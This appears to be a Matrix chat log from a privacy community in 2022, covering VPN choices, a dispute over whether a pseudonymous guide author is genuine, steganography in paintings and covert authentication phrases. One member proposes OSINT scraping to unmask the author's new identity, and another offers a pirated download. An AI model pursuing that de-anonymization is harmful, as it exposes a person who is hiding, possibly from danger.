4.3.2022, 08:14:17 - karlq: Same as claiming to be a girl (of course I have no idea & best wishes if true is obvious), but even if most people wont believe it, it's still a net gain in terms of anonymity to be casting a broad net.
4.3.2022, 08:21:10 - SamLeh: I loved Torres Del Paine, very nice... And also plenty of room and enjoy anonymity without too close neighbors. Also Punta Arenas was far enough from everything, yet it's on Chile's side.
4.3.2022, 08:21:55 - karlq: Does anyone here host their own VPN on VPS?
4.3.2022, 08:24:16 - SamLeh: karlq: You don't really need to especially host it, just run ssh with -D - But sure, my VPSs and physical servers also run wireguard.
4.3.2022, 08:28:19 - SamLeh: I have to play a game today later - https://archive.org/details/msdos_Nuclear_War_1989
4.3.2022, 09:04:45 - karlq: SamLeh: How safe is that, comparatively to say Mullvad, if you have active efforts to compromise?
4.3.2022, 09:05:00 - karlq: I figured Mullvad would probably have better security than I'd be capable of setting up with research on my own in that regard.
4.3.2022, 09:05:18 - karlq: So not for a mass government collection threat model but more targeted.
4.3.2022, 09:12:15 - toor: I would say that for privacy it would make sense to use something like mullvad
4.3.2022, 09:12:46 - toor: If you setup a vpn on a vps and are the only one using it, then all traffic coming from that ip is from you
4.3.2022, 09:12:52 - sn0w(🕊️Anonypla): Rise Up VPN is pretty good
4.3.2022, 09:13:11 - toor: Whereas with a vpn service, othe peoples traffic will be thrown in the mix
4.3.2022, 09:20:32 - SamLeh: Yet I seriously dislike any VPN which says that you must use their own client. It's always like, oh well, why?
4.3.2022, 09:22:33 - suspiciousactions: i would try to support smaller vpns, as the centralization of VPNs is a worrisome trend.
4.3.2022, 09:47:00 - sn0w(🕊️Anonypla): tbh with you,  why would she tell us her name if she was big on anonyminity, and someone with that kind of knowledge wouldnt have the people around  them know about them.
4.3.2022, 09:47:31 - sn0w(🕊️Anonypla): and how would a few russian grunts know her? hella sus
4.3.2022, 09:54:12 - karlq: Yeah I mean for how complicated the guide is you'd expect a little more sophistication with the story. But then again perhaps that indicates a third party communicating. We'll see with time.

4.3.2022, 16:04:54 - SamLeh: KennyWalther(🕊️Anonypla): Just checked, that's actually document version 0.9.9f so the git clone isn't latest... If you have the 1.1.2 git, yes, I'm still interested.

4.3.2022, 21:19:26 - neo_sodom(🕊Anonypla): KennyWalther(🕊️Anonypla): We know. Just banter man
4.3.2022, 21:19:50 - bitmonero: In the case of AnonymousPlanet, there are three scenarios:
- This is all a hoax and she/he has an IQ of 230.
- The situation is real, let's hope for the best.
- This is a very well planned NSA intervention to make this project a honey pot.
4.3.2022, 21:20:05 - KennyWalther(🕊️Anonypla): xD
4.3.2022, 21:20:41 - neo_sodom(🕊Anonypla): Three is unlikely. We have all the files and the checksums so why bother
4.3.2022, 21:20:47 - KennyWalther(🕊️Anonypla): <@bitmonero:monero.social "In the case of AnonymousPlanet, ..."> well the 2 options are the good one xD i doub nsa have some kind of interest 
4.3.2022, 21:22:12 - neo_sodom(🕊Anonypla): She's not a big fish, since this is all publicly known information and there are many forks of this project as well as alternativea (even tho not in this complexity)
4.3.2022, 21:23:44 - suspiciousactions: I will say it: It does not make any sense to disclose her age and name. It is unnecessary. Also it does not make sense to be specific about the town (Ukraine war, russian troops approaching would be enough). Besides it does not make any sense to burn this account. As if the russians would care tbh. They probably don't have data on all ukrainians, much less about anon. She oviously knows how to stay under the radar.

I think the contamination of her account got too worse for her taste and the Ukrainian girl is just a fitting pretext to exit this identity. Obvidously i don't know, but this is the scenario i believe is a bit more likely than the pretext.
4.3.2022, 21:31:05 - KennyWalther(🕊️Anonypla): Idk tbh ,who actually knows ? Only her knows the real thruth 
4.3.2022, 21:40:21 - neo_sodom(🕊Anonypla): <@suspiciousactions:matrix.org "I will say it: It does not make ..."> The additional information in the statement as well as on her about page contradicted the whole anonymity thing.

It can be a plausible explanation, but in my opinion it is a wasted identity. Sure, she got some attention over the last one and a half years, but wasn't that the goal in the first place, making people aware? What now? I only see two options. Either she continues the guide completely anonymously via a fork on GitHub for example or she uses a new identity (the new girl that has yet to arrive). Both could more or less easily traced back to her. The guide maintained from AnonyPla as well as her identity are essentially dead.
4.3.2022, 21:43:26 - suspiciousactions: agree
4.3.2022, 21:44:07 - suspiciousactions: maybe we should build a git(whatever) instance somewhere and just enhance the guide?
4.3.2022, 21:45:19 - neo_sodom(🕊Anonypla): I honestly can't blame her. Writing and maintaining such a complex guide + social media + the communities here is just a huge workload. Without donations and a 9-5 job an absolute pain. If you then want to have other hobbies, friends etc. good luck with that
4.3.2022, 21:45:37 - suspiciousactions: <@neo_sodom:matrix.org "I honestly can't blame her. Writ..."> yeah.
4.3.2022, 21:45:41 - neo_sodom(🕊Anonypla): <@suspiciousactions:matrix.org "maybe we should build a git(what..."> Probably what she would have wanted
4.3.2022, 21:45:55 - suspiciousactions: what contradictory information on the about page do you mean?
4.3.2022, 21:48:14 - neo_sodom(🕊Anonypla): The personal things like "woman", " not rich". Why disclose that when you want to stay anonymous. Not even the claims about Germany were right. Makes you wonder
4.3.2022, 21:48:59 - suspiciousactions: claims about germany?
4.3.2022, 21:50:31 - suspiciousactions: maybe i missed something. But honestly: I was (and still are) relatively convinced that she is from germany. There are a couple indications for that. At least i am pretty sure one "somewhere in europe" cuz of her knowledge about the politics their and her day/night cycle.
4.3.2022, 21:50:49 - neo_sodom(🕊Anonypla): Her Github/ Twitter pages said that the was from Germany. She also specifically wrote the guide for German residents
4.3.2022, 21:51:10 - neo_sodom(🕊Anonypla): Hold on
4.3.2022, 21:51:18 - suspiciousactions: lol. Yeah the "applicable to german law" n stuff.

4.3.2022, 21:56:34 - suspiciousactions: we should do some serious OSINT scraping now imo. sounds like a lot of fun. We have enough data on her to have a realistic chance to identify her alt.
4.3.2022, 21:57:14 - suspiciousactions: especially in regards to online activity. maybe we can spot some patterns.

5.3.2022, 01:18:10 - deathcubek: <@suspiciousactions:matrix.org "I will say it: It does not make ..."> Agree. IIRC in her Mastodon, she challenged ppl to doxx her. Maybe it went out of control and all those annoyances of keeping the Anonypla server alive got her nastily. Who knows Anonypla might be a couple of person

6.3.2022, 19:19:27 - neo_sodom(🕊Anonypla): No but you have to understand that we are sceptical of persons pretending to be others. Especially here
6.3.2022, 19:19:29 - @ciaobella:matrix.org: And I'm gonna vanish again
6.3.2022, 19:19:39 - @ciaobella:matrix.org: yes
6.3.2022, 19:19:43 - @ciaobella:matrix.org: I don't care
6.3.2022, 19:20:13 - neo_sodom(🕊Anonypla): Alright? Why exactly did you join in the first place today?
6.3.2022, 19:21:06 - neo_sodom(🕊Anonypla): So that we know that you are alive?
6.3.2022, 19:21:15 - @ciaobella:matrix.org: FUCK YOU neo_sodom(🕊Anonypla) ... I GOT FUCKING BEATEN AND RAPED AND I M FLEEING THE FUCKING COUNTRY OKAY ? 
6.3.2022, 19:21:19 - @ciaobella:matrix.org: HOW S THAT
6.3.2022, 19:21:26 - @ciaobella:matrix.org: BABBA WILL CONFIRM
6.3.2022, 19:21:47 - neo_sodom(🕊Anonypla): How about the good old 4chan verification. A piece of paper, your hand and the current date
6.3.2022, 19:22:52 - KennyWalther(🕊️Anonypla): Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): come on man , come here to confirm that ....
6.3.2022, 19:24:29 - neo_sodom(🕊Anonypla): <@ciaobella:matrix.org "FUCK YOU neo_sodom(🕊Anonypla) ...."> Emotional blackmailing, really?
6.3.2022, 19:27:33 - neo_sodom(🕊Anonypla): ciaobella: Because of which law did you invite me again, after I got kicked for sending trading cards here?
6.3.2022, 19:29:13 - @ciaobella:matrix.org: Oh yeah ... no fucking MTG cards mmmmh ... I don't recall ... Babba is the only person who can confirm my identity anyway
6.3.2022, 19:29:30 - neo_sodom(🕊Anonypla): It wasn't that long ago
6.3.2022, 19:30:02 - neo_sodom(🕊Anonypla): 4th of February

6.3.2022, 19:32:03 - neo_sodom(🕊Anonypla): You know what ciaobella: I think that you are not AnonyPla
6.3.2022, 19:33:30 - SamLeh: I did have some pretty old private discussions with AnonyPla, but so far the (supposed) new account haven't delivered... 
6.3.2022, 19:33:38 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): <@narktor:matrix.org "Babba27's Evil Twin (DriftNotSki..."> I can confirm. anonymousplanet.org was taken down after the Russian military forced her to disclose her keys
6.3.2022, 19:34:25 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): That account hasn't been verified, but a verified account reached out last night and told me that
6.3.2022, 19:34:38 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): The information matches
6.3.2022, 19:35:05 - SamLeh: Recent discussions are invalid, because I assume those were also captured... 
6.3.2022, 19:36:01 - neo_sodom(🕊Anonypla): Alright but how can we verify that this is AnonyPla without needing to trust you Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): 
6.3.2022, 19:36:06 - KennyWalther(🕊️Anonypla): ciaobella: babba is here proove that you are anonypla
6.3.2022, 19:38:04 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): <@neo_sodom:matrix.org "Alright but how can we verify th..."> You can't? The Russian miitary got access to all her data through rubber hose cryptanalysis (also known as the $5 wrench technique) which means her cryptographic signing keys are also compromised
6.3.2022, 19:38:37 - neo_sodom(🕊Anonypla): Great. So we blindly have to trust you?
6.3.2022, 19:38:57 - SamLeh: <@memorysafetybelike:envs.net "You can't? The Russian miitary g..."> I would also believe that version...
6.3.2022, 19:39:38 - SamLeh: Whole thing seemed too strange. And because she kept so high security, I wouldn't expect anything would have been lost, unless something very bad happened. 
6.3.2022, 19:40:51 - SamLeh: Also keep reasonable doubt. What's the point of "getting verified quickly", what's the matter? What's the point of that? Getting access or credentials to something or what?
6.3.2022, 19:41:15 - KennyWalther(🕊️Anonypla): now that babba is here she dont respond or send messages anymore ...wow....
6.3.2022, 19:42:27 - SamLeh: Don't hurry let's hear it out... Anyway, also if key responses take too long... It might mean that someone has to dig out some info or something un-usual... 
6.3.2022, 19:54:14 - neo_sodom(🕊Anonypla): I won't believe a "source: bro trust me" claim. There has to be different way to authenticate
6.3.2022, 19:55:16 - KennyWalther(🕊️Anonypla): lets wait for babba to verify her xD 
6.3.2022, 19:55:52 - KennyWalther(🕊️Anonypla): and we will see if she is anony

6.3.2022, 20:08:16 - neo_sodom(🕊Anonypla): If she says "they deleted everything" that must mean that they specifically searched for her

7.3.2022, 09:18:24 - KennyWalther(🕊️Anonypla): Hey guys ,i have a few words before probably purging my identity and my existance from this rooms ( not sure yet xD) xD I wasn't to much arout here but i want to believe it was enought xD I was basicly captivated by Anonypla ,her thinking her style of beeing and many more xD She is an interesting person xD and i was hungry for knowing and interacting with special individs. Now i screwed the canche of beeing an important person on this comunity (mod on other rooms too ) She might hunt me after she get out of the country or she find a safe place xD The admin Babba is not capable of managing few interviews and nor the person who invited in the interview rooms xD i'm not a thenical person i might dont know much ,i'm not a guru in tech world but i try to do my best and learn xD I'm insensible because of an emoji "xD" that meant nothing even in the context xD i cant put basicly Anonypla's name and "xD " in the same proposition because i'm insensible . "They" (babba) even dont know if "they " might have more questions for my interview . If i'm hunt for my opinion i'm ok with that it was my choice to tell what i told .
7.3.2022, 09:19:03 - KennyWalther(🕊️Anonypla): Babba from my pov is not capable of managing this xD 
7.3.2022, 09:19:15 - KennyWalther(🕊️Anonypla): And probably the comunity will die 
7.3.2022, 09:19:21 - KennyWalther(🕊️Anonypla): Thats my opinion 
7.3.2022, 09:19:27 - KennyWalther(🕊️Anonypla): I hope will not die 
7.3.2022, 09:19:37 - KennyWalther(🕊️Anonypla): But its a thing of time now xD 
7.3.2022, 09:20:35 - suspiciousactions: I would say: Wait and observe the situation. We all are going through a rough time right now. Give it some time.

7.3.2022, 09:26:48 - suspiciousactions: i could confirm her identity too if in doubt. Shared secret n stuff. (Just saying that in case this is needed some time in the future)

7.3.2022, 10:57:24 - suspiciousactions: we need something decentralized like tikok
7.3.2022, 10:57:56 - suspiciousactions: imagine a war with china involved and tiktok won't work for this. like at all.
7.3.2022, 10:58:13 - TheAnonymouseJoker: But it also needs colossal data center, donated for free, for that to be possible. Only corporations can do this level of hosting.

7.3.2022, 10:58:41 - suspiciousactions: peertube does work too

7.3.2022, 11:02:14 - TheAnonymouseJoker: UX matters the most, no matter who thinks what. Just because people like us can use Linux CLI tools comfortably does not mean anything.

7.3.2022, 11:04:12 - suspiciousactions: im not an UX dude, but just because there is no UX is not a real argument against systems. I do agree with the statement, that good UX is missing at a lot of projects, but it is nothing inherent to the underlying systematic approach like decentralization.

7.3.2022, 22:25:13 - suspiciousactions: not
8.3.2022, 05:51:41 - SamLeh: But crypto is like digital cold. You're able to use use it without power networks or computers... oh wait....

They're going to have parallel blockchain which will get invalidated when the "net split" ends. So....

8.3.2022, 10:08:01 - SamLeh: suspiciousactions: I usually don't until failure... But I never store any important data on a single disk or single location.
8.3.2022, 10:08:31 - SamLeh: If unsure run have a copy and run badblocks read write test... Read test alone is pretty much useless.
8.3.2022, 10:10:16 - suspiciousactions: running a smart long selftest now... probably go with one run of badblocks afterwards. im not sure what this raw read error" is tbh, maybe it is just an artifact of not gracefully shutting down the hdds or something.

13.3.2022, 20:41:51 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): I also translated it with Google Translate:

> The State Duma does not expect Telegram to be blocked after other social networks
> 
> Oleg Matveychev, deputy chairman of the committee on information policy, information technology and communications, told Podyom that as long as the messenger is politically neutral, they will not touch it, and there is no need to become biased by Telegram.
> 
> > “Durov found a compromise with the FSB. Not an agreement, not that he unequivocally said “come in, do whatever you want in my household”, but managed to convince him that people's lives are important and that terrorists are negotiating through Telegram.
> 
> > Requests within the framework of operational activities are transferred there if terrorists or someone is under control. Telegram installed equipment to be able to watch all the dangerous subjects.”
> 
> According to Matveychev, there is no manipulation and censorship in Telegram, which is what Facebook and Instagram do, it is “just a platform with various bloggers, so for now you can cooperate with it.”
> 
> > “If Telegram starts pursuing a censorship policy against Russia, allowing the publication of calls to kill (as Meta did), of course, it will have problems. But why does he need it? Durov is now receiving a huge influx of traffic, people from Facebook and Instagram are leaving for Telegram. And why would he do such a stupid thing to get blocked?”
13.3.2022, 20:42:01 - Babba27's Evil Twin (DriftNotSkid) [they|them] (🕊️AnonyPla): The key part being

15.3.2022, 13:22:47 - neo_sodom: "This extraordinary example of Ryman’s artistic process and creation, Bridge is a consummate expression of Ryman’s mastery of materials while at the same time an invitation to explore the optical and tactile charge that inheres in this work.

15.3.2022, 16:36:17 - neo_sodom: What other color are you seeing?
15.3.2022, 16:40:25 - SamLeh: neo_sodom: I don't know how that color question technically is relevant. As long as it isn't 100% white (without any grayscales) it can contain hidden information. 
15.3.2022, 16:41:33 - neo_sodom: I didn't alter it. Check the hash from the Christie's website. Theoretically they should match 
15.3.2022, 16:42:40 - SamLeh: Well, the information can be already embedded in the original. It doesn't matter if you altered it or not.
15.3.2022, 16:42:50 - SamLeh: The artists message, of course.
15.3.2022, 16:44:26 - neo_sodom: Probably not. The guy from Christie's would have had done that. Or do you mean Ryman?
15.3.2022, 17:05:45 - SamLeh: neo_sodom: Yes, Ryman... It would be so classic to embed hidden message. When you can do it, why not? 
15.3.2022, 17:08:19 - neo_sodom: How would you extract or embedd it?
15.3.2022, 17:09:37 - SamLeh: Using classic means, like the brush strokes. It's clearly not completely uniform, so it can carry information. Orientation, length, locations, whatever...  There are countless means, using classic steganography. Not just new kids on the block, I altered the PNG version... 
15.3.2022, 17:10:53 - SamLeh: Isn't whole point of steganography that you can't detect or extract it if you don't know what it is? 
15.3.2022, 17:12:48 - neo_sodom: Yes. It definitely would be an interesting project
15.3.2022, 17:13:38 - SamLeh: The AnonyPla case made me think about the non-cryptographic authentication methods. Which are things that interrogator can't easily extract. They don't know what to ask for, and the scheme can be such that no external party can reliably complete the task, because it's based on something they don't have adequate knowledge or skills about. - Classic agent conversation authentication, but with twists which you can't follow if you're impostor.
15.3.2022, 17:17:12 - neo_sodom: I would think the easiest/most basic method would be brush stroke direction to binary. What else could one use?
15.3.2022, 17:19:40 - SamLeh: witdh, color (slight variations of course), pressure, brush stroke pattern (which kind of bruch), starting, ending position, and so on. Paint type.... The list is endless...  
15.3.2022, 17:20:05 - neo_sodom: Hmmm I will try that in the future
15.3.2022, 17:20:38 - SamLeh: Oil painting actually carries huge amount of information, I don't know how many paints you got, but I've got many and there's a lots and lots of info on each of those...  It's high resolution 3d surface....
15.3.2022, 17:24:21 - SamLeh: With acrylic paint you could carry more info than with traditional oil. In simplest form you could just light the painting from specific direction and shadows would reveal the message... Just to play with very simple ideas.
15.3.2022, 17:27:47 - neo_sodom: <@sl:envs.net "With acrylic paint you could car..."> Seems to be a lot of work figuring out *how* to paint before even starting. What do you mean with "carry information"? The stronger texture of the paint?
15.3.2022, 17:29:16 - SamLeh: neo_sodom: Well, it's clear you haven't been working with paintings... But let's say, there's incredible amount of information you can embed and recover if you just know what you're looking for. And it doesn't need to be any clear "bit pattern" on the painting. 
15.3.2022, 17:29:52 - SamLeh: Here's good example about Acrylic work so you'll get some sense how complex the surface can be - https://greenorc.com/wp-content/uploads/2019/04/Acrylic-Painting-Techniques-All-Beginners-Should-Try-2-1.jpg
15.3.2022, 17:30:16 - SamLeh: I've got also paintings which are done just for me, based on order, but I'm not going to share those on this channel. 
15.3.2022, 17:32:01 - neo_sodom: Ok thanks
15.3.2022, 17:34:18 - SamLeh: Anyway, depending on situation, I would as usual always use shared code book "compression". To minimize the amount of bits that need to be embedded to pass the message. If possible.
15.3.2022, 17:37:43 - neo_sodom: So that a short pattern makes up a whole pre shared sentence, for example?
15.3.2022, 17:54:24 - SamLeh: Yes, if context can be limited that can be enormously helpful.  Full text is so inefficient compared to that.
15.3.2022, 17:59:50 - SamLeh: Also just to make give impression how photograph of painting doesn't really carry the information, you could as example have slight magnetic charge on some of the paint, when you've mixed it. That information is totally lost if someone takes photograph, or paint could have hue which is visible only in ultraviolet or similar aspects. Also 3d printed objects are "holographic memory", those can contain very complex non-visible information patterns only revelated by mri or CAT scan etc...
15.3.2022, 18:02:01 - SamLeh: Computers make just that work much easier, but if necessary many steps can be done in manual. As example in the jail cases where you've got limited communication channel, but really much time to deal with messages.
15.3.2022, 18:05:46 - SamLeh: As example, candle is an object which can be done completely manually just like it would be 3d printed. And you can embed lots of information in it. And nobody will know what it contains, unless they know.
15.3.2022, 18:12:22 - SamLeh: neo_sodom: Did you find the message in this work? - https://www.telegraph.co.uk/multimedia/archive/02106/hitler_2106913b.jpg
15.3.2022, 18:15:14 - neo_sodom: The pattern is irregular. Morse code maybe. It would fit to the time it was done
15.3.2022, 18:15:22 - SamLeh: Yes, right.
15.3.2022, 18:16:02 - neo_sodom: Don't tell me. I want to see if I can translate it (later when I have more time on my hands).
15.3.2022, 18:16:25 - SamLeh: That's bad photo, whole message isn't in it... 
15.3.2022, 18:16:28 - neo_sodom: It does not seem very smart if someone like me can spot it in 20sec
15.3.2022, 18:17:19 - SamLeh: That's the case sure... There are many cases where very very simple means have worked. When they're not alert and watching... 
15.3.2022, 18:18:47 - neo_sodom: Even though that the morse code could be altered with something like Caesar cipher
15.3.2022, 18:18:59 - neo_sodom: Would make it a bit harder
15.3.2022, 18:20:41 - SamLeh: Different simple encoding schemes are plentiful. As well as simple ciphers... Most of those won't stand for modern attacks, but first they need to know to look for the message. Also if code book is used, it still would make it much harder to crack that text.
15.3.2022, 18:22:45 - SamLeh: Of course in worst case you'll end up in situation where you don't have any external information access and any tools. So you'll have to deal with something you already know and tools like pen and paper alone. Nothing else allowed. That's why many tricks are really simple. It's also very good if it escape the check by captors, and is still decipherable by recipient which might expect to receive ciphered message. So it can't be too hard to crack... Classic problems.

17.3.2022, 13:42:11 - toasterbirb: It drains battery quite nicely
17.3.2022, 15:24:59 - 0xbad1dea: And consistently
17.3.2022, 15:32:04 - toasterbirb: My phone has shutdown during the night like twice already
17.3.2022, 15:32:34 - toasterbirb: One morning it had shutdown and to my surprise when I booted it up, it had over 80% battery. It worked fine for a while and then just shutdown with no battery left after a while
17.3.2022, 15:40:50 - neo_sodom: <@toasterbirb:halogen.city "sent an image."> Hardened Signal gang rise up
17.3.2022, 15:41:26 - toasterbirb: <@neo_sodom:matrix.org "Hardened Signal gang rise up"> Signal is another app that I had to tame a bit or else it uses up all of my battery. Not as fast as Orbot right now, but it made my phone really hot and the battery didn't last even a day with it
17.3.2022, 15:41:36 - toasterbirb: So I have been moving back to SMS because I can't use Signal with notifications
17.3.2022, 15:42:59 - neo_sodom: Yeah, the notification don't work all the time for me too
17.3.2022, 15:43:58 - toasterbirb: It still has awfully big uptime even though I haven't even launched the app :D
17.3.2022, 15:44:20 - toasterbirb: I use Element and it has notifications enabled too, but it still uses way less battery compared to Signal
17.3.2022, 15:45:17 - toasterbirb: The Signal devs should really take their head out of the Google services sandpit and figure out their Google-free notification system 
17.3.2022, 15:46:34 - neo_sodom: I noticed that Pihole had hundreds of requests to whisper systems. Molly probably checks every minute or two
17.3.2022, 15:47:27 - toasterbirb: Yea I read somewhere that the Signal devs are adamant about instant notifications. They don't like people asking for custom intervals
17.3.2022, 15:47:46 - toasterbirb: I'd be fine with the app checking for new messages every hour or so, but oh well
17.3.2022, 18:56:53 - SamLeh: <@toasterbirb:halogen.city "Signal is another app that I had..."> Strange, I don't see any reason why Signal should be consuming any more resources than Telegram or WhatsApp... 
17.3.2022, 19:00:38 - toasterbirb: <@sl:envs.net "Strange, I don't see any reason ..."> I don't have Google play services on my device, so its using their socket implementation. They probably ping their servers way too often keeping the device up all day long
17.3.2022, 19:18:12 - SamLeh: <@toasterbirb:halogen.city "I don't have Google play service..."> Yeah, that sure does consume extra energy... Just like Briar...

18.3.2022, 22:10:43 - boberts29292992: I declined it
18.3.2022, 22:10:46 - toasterbirb: There are actually a few matrix home servers dedicated to that shit
18.3.2022, 22:12:00 - boberts29292992: How do I turn off random room invites
18.3.2022, 22:12:14 - toasterbirb: There isn't such feature currently as far as I know
18.3.2022, 22:12:33 - boberts29292992: O well :/
18.3.2022, 22:13:00 - toasterbirb: It might also be that you won't be getting any more of those invites after you declined the ones you got after joining some room
18.3.2022, 22:13:19 - toasterbirb: I knew a guy who had a bot with a list of rooms to spam invites to. It would send an invite only once to each memeber
18.3.2022, 22:14:03 - toasterbirb: At some point I found out that their whole rooms was just full of borderline pedos consooming loli art so I just left. I lost way too many braincells into that place
18.3.2022, 22:14:16 - boberts29292992: Damn
18.3.2022, 22:14:20 - boberts29292992: Matrix is scary
18.3.2022, 22:14:25 - boberts29292992: I just stick to privacy rooms
18.3.2022, 22:15:01 - toasterbirb: <@boberts29292992:matrix.org "Matrix is scary"> That is what decentralized networks with anonymity gets you. It can't really be avoided
18.3.2022, 22:15:14 - boberts29292992: I see
18.3.2022, 22:15:43 - toasterbirb: They laugh at you if you block their home server. Its almost like a medal of honor for them

18.3.2022, 22:40:23 - boberts29292992: Just in case there is any illegal material in the room
18.3.2022, 22:40:34 - boberts29292992: Should I report them too?
18.3.2022, 22:41:48 - neo_sodom: Unless you can proof that there is illegal content. I can't find or access the room, so no. Don't report it yet
18.3.2022, 22:52:49 - toasterbirb: <@boberts29292992:matrix.org "Should I report them too?"> to whom? lol
18.3.2022, 22:53:06 - boberts29292992: O wait

18.3.2022, 22:53:27 - toasterbirb: matrix.org has already probably blocked midov.pl
18.3.2022, 22:53:34 - toasterbirb: they have washed their hands
18.3.2022, 22:53:43 - boberts29292992: I see
18.3.2022, 22:53:54 - toasterbirb: the only place that would care would be the company hosting midov.pl if they aren't self hosting their services
18.3.2022, 22:54:43 - toasterbirb: Matrix is just a protocol in the end. Anyone with a static IP and a PC can host their own home server

23.3.2022, 15:02:30 - SamLeh: All white version, hmm, interesting. I initially thought about Aboriginal art in Canberra museum, all the colored dots and so on. 
23.3.2022, 15:03:26 - neo_sodom: Step 1: Don't believe your perception of things
Step 2: Go crazy
23.3.2022, 15:04:45 - SamLeh: So, do you think average cargo / prisoner handler would get that message? 
23.3.2022, 15:05:36 - neo_sodom: If you have enough time (1-2 hours depending on how well you can read it), yes
23.3.2022, 15:05:39 - SamLeh: I also thought it would be pretty awesome if NTF art would actually contain the NFT identifier in the art itself... It would made it pretty unique. But if it's good hash, then it's aaah, bit hard. 
23.3.2022, 15:05:59 - SamLeh: <@neo_sodom:matrix.org "If you have enough time (1-2 hou..."> Well, well all know that they're usually not that interested. ;) 
23.3.2022, 15:07:00 - neo_sodom: It is not hard to decipher, you could do it, thus it is not a foolproof solution against an adversary.
23.3.2022, 15:08:32 - SamLeh: neo_sodom: Sure, as mentioned good steganography shouldn't be identifiable at all, without knowing what you're looking at.  Of course you can suspect it, and in some situations like in prisoner case, you can simply deny the access / forwarding of the suspected uh oh, object, but in general most of people won't think that far.
23.3.2022, 15:09:54 - SamLeh: Just yesterday watched some good old spy stuff. They had a book, and on one page, a single dot, was "microdot" containing all the secrets. So sure, you can find it, but as long as you're not under very serious scrutiny, nobody's going to ever find that. Because it still looks just like regular dot on any sentence on the book.
23.3.2022, 15:11:25 - neo_sodom: Yes, hiding the fact that you are using steganography at all, is probably the hardest task.
23.3.2022, 15:11:31 - SamLeh: "Secrets Of The Spies (2022) TV Series" was the set of documentaries I watched.  (dm for ddl)
23.3.2022, 15:15:00 - SamLeh: <@neo_sodom:matrix.org "sent an image."> What's the copyright / license on that thing? 
23.3.2022, 15:15:14 - neo_sodom: Self-painted?
23.3.2022, 15:15:26 - neo_sodom: What license is that?
23.3.2022, 15:15:37 - SamLeh: Well, then it's up to you to define it. 
23.3.2022, 15:15:51 - neo_sodom: Uhhg give me a few minutes
23.3.2022, 15:17:22 - SamLeh: neo_sodom: http://www.wtfpl.net/ ? 
23.3.2022, 15:20:00 - SamLeh: Or maybe you're going to sell it on Christie's? 
23.3.2022, 15:22:16 - neo_sodom: <@sl:envs.net "Or maybe you're going to sell it..."> Who knows. I could email them just for fun actually.
23.3.2022, 15:22:27 - neo_sodom: Idk man but  CC BY-SA sounds ok to me.
23.3.2022, 15:26:22 - SamLeh: I'm pretty sure everyone in this group is familiar with this art work - https://en.wikipedia.org/wiki/Kryptos
23.3.2022, 15:36:45 - SamLeh: 196 bits? At least that would make a good spot to hide encryption key on your wall... In everyone's sight... Haha.
23.3.2022, 15:37:05 - SamLeh: And then you could have a few decoys in safe... And ... Everyone would be fooled.
23.3.2022, 15:38:25 - BaikaAllures: <@sl:envs.net "I'm pretty sure everyone in this..."> Nope i didnt know it existed tbh
23.3.2022, 15:54:51 - neo_sodom: <@sl:envs.net "196 bits? At least that would ma..."> Sure, let me just make 20 more decoy paintings and call it a series. Fibonacci sequence in all of them. Bit 1 in 1, Bit 2 in 2, Bit 3 in 3, Bit 4 in 5, Bit 5 in 9 ... if we hit 20, we start in the second row but from the other side
23.3.2022, 15:56:22 - neo_sodom: Actually not a bad idea. Anonypla could have used that
23.3.2022, 15:58:35 - SamLeh: Also you can have your secrets posted somewhere, so it's not clearly in your secring.gpg file... Your secret key could be in your facebook public profile, or imgurl, but nobody just knows it. Then you don't lose it, and they might not know what to ask for. I'm guilty as charged, I might have a few decoys for too curious people.
23.3.2022, 15:59:36 - neo_sodom: *opens Hex-editor*
23.3.2022, 16:01:30 - SamLeh: About that AnonyPla case... In many cases very simple authentication could be a word or something similar, which you can just slip into conversation. So it's not obvious for even outsiders following the conversation that you just authenticated. Simple agreed protocol, yet not obvious. Also with agreed duress identifier, so you can play that the authentication happened, even if it didn't.
23.3.2022, 16:03:02 - SamLeh: That would just ruin so many of the CEO / I'm in trouble send me money scams...  And also relieve the potential stress, that now I didn't help... Well, I didn't help, because I know it's a scam.
23.3.2022, 16:07:23 - neo_sodom: Very interesting
23.3.2022, 16:07:45 - SamLeh: Not really, standard procedure...  Good things to teach to children as example... And with key personnel and so on. 
23.3.2022, 16:09:32 - neo_sodom: No one teached me that, that's why I thank you for doing it
23.3.2022, 16:11:43 - SamLeh: I'm also avoiding giving any exact examples, because I don't want to reveal the processes I / we are using.
23.3.2022, 16:12:09 - neo_sodom: no problem

And nobody suspected it could contain a message. So I think steganography passed with flying colors in this case. Haha.
24.3.2022, 15:34:29 - neo_sodom: <@sl:envs.net "neo_sodom: Today I asked around ..."> Damn, really? That's so cool. With all the feedback I decided to make a few more. They don't contain anything ... or don't they? ;)
24.3.2022, 15:35:22 - SamLeh: I think you should put it on pb.envs.net or some other place where you can post your own "note" with it, asking for feedback or something. I could tweet that image with the link... And then just wait (if ever) you'll get message from anyone who has solved the puzzle.
24.3.2022, 15:35:40 - SamLeh: Imagine how confusing it would be, if it would be instead of all white some "bad" pixel art. Haha.

26.3.2022, 07:28:41 - SamLeh: I just yesterrday while going to work, thought that if I would need to make that kind of painting, I would probably add a "disco man" shadow to it, so the colors in teh "background" would be just lights... So people would pay even less attention to colors. Yet, I could also use shades, and stroke direction to add bits.  With acrylic paint the stroke direction is easily well preserved as well...

27.3.2022, 18:48:14 - SamLeh: I wrote one too, deletes messages after specified time. But it's annoying that matrix protocol keeps getting changed and there's constant need to maintain it. Which is why I kind of dislike projects which evolve all the time, even if it's great to get progress.
27.3.2022, 18:48:29 - SamLeh: Of course the "delete" isn't actually delete, it's just redact message, but yeah. That's what the script does.

3.4.2022, 10:33:57 - theShadow: duel of egos, what waste of time
3.4.2022, 10:34:39 - theShadow: he clearly has some issues, better to be dealt with

I must admit that made me laugh.

7.4.2022, 12:51:08 - SlickRick: Weird troll.

7.4.2022, 12:52:44 - SlickRick: I love how he comes to an anonymity & privacy centric chat to somehow lecture us about being simps who are content 'living under the boot'
7.4.2022, 12:53:09 - SlickRick: Very strange but quite amusing. Definitely worthy of a ban, although generally I appreciate less moderation over more, this was very much appropriate because pure troll.

8.4.2022, 11:08:12 - SlickRick: What matrix client is best for whonix?
